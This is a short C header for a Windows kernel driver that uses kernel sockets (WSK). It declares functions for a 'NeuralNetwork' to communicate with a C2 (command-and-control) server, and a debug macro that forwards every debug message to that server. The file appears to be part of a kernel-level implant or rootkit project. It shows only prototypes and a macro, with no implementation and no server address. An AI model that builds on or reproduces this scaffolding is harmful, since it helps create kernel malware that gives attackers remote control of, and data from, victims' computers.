#pragma once

#define NDIS_SUPPORT_NDIS6 1
#define NDIS60 1
#define _NDIS_

#include <ntddk.h>
#include <ntstrsafe.h>
#include <wsk.h>
#include "nn.h"


// Function prototypes
NTSTATUS InitializeWskData(void);
void FreeWskData(void);
NTSTATUS NeuralNetwork_CommunicateWithC2(NeuralNetwork* nn);
NTSTATUS SendDebugMessageToC2(const char* message);

// WSK client dispatch table
extern WSK_CLIENT_DISPATCH WskClientDispatch;

// Debug macro that sends to both DbgPrint and C2
#define C2_DBG_PRINT(Format, ...) \
    do { \
        CHAR dbgBuffer[512]; \
        RtlStringCchPrintfA(dbgBuffer, sizeof(dbgBuffer), Format, ##__VA_ARGS__); \
        DbgPrint("%s", dbgBuffer); \
        SendDebugMessageToC2(dbgBuffer); \
    } while (0)